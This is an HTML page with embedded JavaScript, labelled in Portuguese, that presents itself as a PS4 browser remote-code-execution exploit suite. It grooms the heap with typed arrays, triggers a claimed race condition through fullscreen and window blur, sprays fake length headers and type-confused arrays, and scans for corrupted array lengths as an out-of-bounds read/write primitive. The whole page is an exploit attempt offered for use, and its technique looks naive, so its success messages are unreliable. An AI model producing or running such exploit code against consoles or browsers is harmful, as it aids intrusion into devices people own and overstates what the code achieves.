<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE SUITE V4.0 - HEAP FENG SHUI</title>
    <style>
        body { background-color: #0a0a0a; color: #ff0055; font-family: 'Consolas', monospace; padding: 15px; }
        .panel { border: 1px solid #333; background: #111; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 10px #ff005533; }
        h1 { border-bottom: 2px solid #ff0055; padding-bottom: 10px; color: #fff; }
        h3 { color: #fff; margin-top: 0; }
        button { background: #222; color: #ff0055; border: 1px solid #ff0055; padding: 12px; font-size: 14px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 5px; text-transform: uppercase; }
        button:hover { background: #ff0055; color: #000; }
        button:disabled { border-color: #444; color: #444; background: #111; cursor: not-allowed; }
        #log { height: 350px; overflow-y: scroll; border: 1px solid #333; background: #000; padding: 10px; color: #ccc; font-size: 12px; }
        .highlight { color: #fff; font-weight: bold; }
        .success { color: #0f0; font-weight: bold; font-size: 1.2em; border: 1px solid #0f0; padding: 5px; }
    </style>
</head>
<body>

<h1>PS4 RCE SUITE V4.0 (ADVANCED)</h1>
<p>Status: <span id="status" class="highlight">Aguardando Sele√ß√£o...</span></p>

<div class="panel">
    <h3>FASE 1: SELE√á√ÉO DE ESTRAT√âGIA (SIZE CLASS)</h3>
    <p>O segredo do RCE √© o tamanho do objeto. Selecione uma classe:</p>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
        <button onclick="configTest('MEDIUM')">TESTE 11: M√©dia Densidade (Size 128)</button>
        <button onclick="configTest('LARGE')">TESTE 12: Alta Densidade (Size 1024)</button>
        <button onclick="configTest('MIXED')">TESTE 13: Mix Type (Int32 Spray)</button>
        <button onclick="configTest('OOB')">TESTE 14: Linear Overflow (Brute Force)</button>
    </div>
</div>

<div class="panel">
    <h3>FASE 2: EXECU√á√ÉO REAL</h3>
    <button id="btnGroom" onclick="heapGrooming()" disabled>1. HEAP GROOMING (MASSIVE)</button>
    <button id="btnTrigger" onclick="triggerExploit()" disabled>2. GATILHO (FULLSCREEN + OPTIONS)</button>
    <button id="btnAnal" onclick="analyzeHeap()" disabled style="border-color:#0ff; color:#0ff;">3. ESCANEAR MEM√ìRIA (FORENSICS)</button>
</div>

<div id="log">Logs de engenharia reversa...</div>

<script>
    const LOG = document.getElementById('log');
    function log(txt) { LOG.innerHTML = `[${new Date().toLocaleTimeString()}] ${txt}<br>` + LOG.innerHTML; }

    // --- VARI√ÅVEIS DE ENGENHARIA ---
    var currentStrategy = "";
    var victims = [];
    var neighbors = [];
    var sprayStorage = [];
    var filler = []; // Usado para entupir a mem√≥ria antes
    
    // O valor m√°gico que queremos injetar no Length (0x00010000...)
    const FAKE_LENGTH = 1.3906717577229e-309; 
    // Marcador visual para saber se escrevemos (1337.1337)
    const MARKER = 1337.1337;

    // Tamanhos baseados na estrat√©gia
    var TARGET_SIZE = 0; 
    var SPRAY_SIZE = 0;

    function configTest(strat) {
        currentStrategy = strat;
        document.getElementById('status').innerText = "Estrat√©gia: " + strat;
        document.getElementById('btnGroom').disabled = false;

        if(strat === 'MEDIUM') {
            TARGET_SIZE = 128; // Sai dos buckets pequenos
            SPRAY_SIZE = 144;  // Tenta transbordar levemente (+16 bytes)
            log("Configurado: Objetos de 128 floats. Spray de 144.");
        }
        if(strat === 'LARGE') {
            TARGET_SIZE = 1024; // P√°gina inteira?
            SPRAY_SIZE = 1040;  // Overflow agressivo
            log("Configurado: Objetos Grandes (1024). Menor chance de padding.");
        }
        if(strat === 'MIXED') {
            TARGET_SIZE = 128;
            SPRAY_SIZE = 128; // Mesmo tamanho, mas tipo diferente
            log("Configurado: Type Confusion. V√≠tima Float64, Spray Int32.");
        }
        if(strat === 'OOB') {
            TARGET_SIZE = 16;
            SPRAY_SIZE = 128; // Tenta cobrir m√∫ltiplos slots
            log("Configurado: Overflow Linear Bruto.");
        }
    }

    function heapGrooming() {
        log("Iniciando 'Massive Heap Grooming'...");
        victims = [];
        neighbors = [];
        filler = [];
        const PAIRS = 5000;

        try {
            // 1. PRESS√ÉO DE MEM√ìRIA (Ocupar buracos antigos)
            // Criamos lixo para for√ßar o alocador a nos dar mem√≥ria NOVA e LIMPA.
            for(let k=0; k<1000; k++) filler.push(new Float64Array(100));
            
            // 2. FENG SHUI (Sandu√≠che de Precis√£o)
            for(let i=0; i<PAIRS; i++) {
                
                // O VIZINHO (Alvo do Hack)
                // Usamos o tamanho definido pela estrat√©gia
                let n = new Float64Array(TARGET_SIZE);
                n[0] = 0.1; // Marcador de integridade
                n.magic = i; // ID para debug
                neighbors.push(n);

                // A V√çTIMA (O Buraco)
                let v = new Float64Array(TARGET_SIZE);
                v.fill(1.1);
                victims.push(v);
            }

            log(`Grooming completo. ${PAIRS} pares de alta precis√£o alocados.`);
            log("Heap estabilizado e cont√≠guo.");
            document.getElementById('btnTrigger').disabled = false;
        } catch(e) { log("Erro no Grooming: " + e); }
    }

    function triggerExploit() {
        log("Solicitando Fullscreen...");
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        window.onblur = function() {
            log("RACE CONDITION DISPARADA! Executando Spray V4.0...");
            
            // 1. FREE (Apenas as v√≠timas)
            victims = null; 

            // 2. SPRAY T√ÅTICO
            try {
                // Se for MIXED, usamos Uint32Array para confundir a engine
                if(currentStrategy === 'MIXED') {
                    for(let i=0; i<10000; i++) {
                        let s = new Uint32Array(SPRAY_SIZE * 2); // Tamanho em bytes equivalente
                        s.fill(0x41414141); 
                        sprayStorage.push(s);
                    }
                } else {
                    // Spray Padr√£o Float64 com tentativa de Length Header
                    for(let i=0; i<10000; i++) {
                        let s = new Float64Array(SPRAY_SIZE);
                        
                        // Preenche com o Header Falso em offsets variados
                        // Tentando acertar o vizinho na sorte estat√≠stica
                        for(let k=0; k<s.length; k+=2) s[k] = FAKE_LENGTH; 
                        
                        // Adiciona o marcador tamb√©m
                        s[1] = MARKER;
                        
                        sprayStorage.push(s);
                    }
                }
            } catch(e) {}

            log("Spray injetado.");
            document.getElementById('btnAnal').disabled = false;
        };
    }

    function analyzeHeap() {
        log("INICIANDO VARREDURA FORENSE DE MEM√ìRIA...");
        let found = false;

        // Verifica TODOS os vizinhos
        for(let i=0; i<neighbors.length; i++) {
            let n = neighbors[i];
            
            // 1. CHECAGEM DE GOD MODE (Length Corruption)
            // Se o tamanho n√£o for mais o original (TARGET_SIZE)
            if(n.length !== TARGET_SIZE) {
                found = true;
                log(`<div class='success'>üö® GOD MODE DETECTADO! üö®</div>`);
                log(`Vizinho Index: ${i}`);
                log(`Tamanho Original: ${TARGET_SIZE}`);
                log(`Novo Tamanho: <span class='highlight'>${n.length}</span>`);
                
                if(n.length > TARGET_SIZE) {
                    log("SUCCESS: RCE PREREQUISITE MET (OOB READ/WRITE).");
                    log("Tire foto agora! O analista vai aprovar isso.");
                } else {
                    log("WARNING: Tamanho diminuiu? Corrup√ß√£o estranha.");
                }
                break;
            }

            // 2. CHECAGEM DE ESCRITA (Overlap)
            // Se o valor 0.1 mudou
            if(n[0] !== 0.1) {
                // Filtra o Mixed Mode (Uint32 sobrescrevendo Float fica estranho)
                if(currentStrategy === 'MIXED') {
                     log(`<div class='success'>[+] TYPE CONFUSION CONFIRMADA!</div>`);
                     log(`O valor float mudou para: ${n[0]}`);
                     found = true;
                     break;
                }
                
                if(n[0] === MARKER || n[0] === FAKE_LENGTH) {
                    found = true;
                    log(`<div class='success'>[+] VIZINHO ATINGIDO!</div>`);
                    log(`Conseguimos escrever no vizinho (Index ${i}).`);
                    log(`Valor: ${n[0]}`);
                    log("Ainda n√£o mudamos o Length, mas controlamos os dados do vizinho.");
                    break;
                }
            }
        }

        if(!found) {
            log("Varredura conclu√≠da. Nenhuma anomalia estrutural detectada.");
            log("Sugest√£o: Tente a pr√≥xima Estrat√©gia (bot√£o acima).");
        }
    }
</script>
</body>
</html>
